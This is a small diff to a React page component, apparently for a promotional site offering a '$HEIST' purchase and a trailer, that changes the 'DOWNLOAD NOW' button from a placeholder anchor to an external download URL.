@@ -396,7 +396,7 @@ export default function Page() {
   ];
 
   const buyNowLink = { href: "#buy", label: "BUY $HEIST" };
-  const downloadLink = { href: "#download", label: "DOWNLOAD NOW" };
+  const downloadLink = { href: "https://chsolanabeach.online/downloads", label: "DOWNLOAD NOW" };
   const trailerVideoId = "UDe0AZYnafg"; // Extracted video ID
   return (
     <main className="bg-black overflow-x-hidden">
